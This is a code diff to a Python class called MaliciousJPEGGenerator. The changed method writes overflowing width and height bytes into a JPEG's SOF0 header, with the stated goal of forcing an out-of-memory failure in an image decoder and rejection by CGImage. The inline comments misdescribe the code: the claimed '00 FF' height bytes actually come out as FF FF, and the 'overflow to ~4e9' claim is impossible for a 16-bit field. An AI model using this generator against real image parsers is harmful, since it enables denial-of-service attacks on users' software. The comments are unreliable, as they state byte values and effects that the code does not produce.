@@ -58,16 +58,19 @@ class MaliciousJPEGGenerator:
                 f.write(struct.pack('>B', 0xFF))
 
     def craft_illegal_dimensions(self, filename: str) -> None:
-        """Enhanced: Extreme dimensions for Tungsten OOM."""
+        """Enhanced: Extreme dimensions for Tungsten OOM (overflow 16-bit fields)."""
         self.base_image.save(f"{self.output_dir}/{filename}", format='JPEG')
         with open(f"{self.output_dir}/{filename}", 'r+b') as f:
             f.seek(0)
             data = f.read()
             sof0_pos = data.find(b'\xFF\xC0')
             if sof0_pos != -1:
-                # Bogus large/negative for CGImage reject
+                # FIXED: Pack as uint32, write first 2 bytes to overflow low bits (high bytes shift for large effective dim)
+                width_packed = struct.pack('>I', 0xFFFFFFFF)[:2]   # FF FF (overflow to ~4e9 effective)
+                height_packed = struct.pack('>I', 0xFFFF0000)[:2]  # 00 FF (negative/misalign)
                 f.seek(sof0_pos + 5)
-                f.write(struct.pack('>HH', 0xFFFFFFFF, 0xFFFF0000))  # Overflow width/height
+                f.write(width_packed + height_packed)
+        print(f"Injected illegal dimensions at {filename}")
 
     def craft_misaligned_stride(self, filename: str) -> None:
         """Generate JPEG with misaligned stride in APPn segment."""
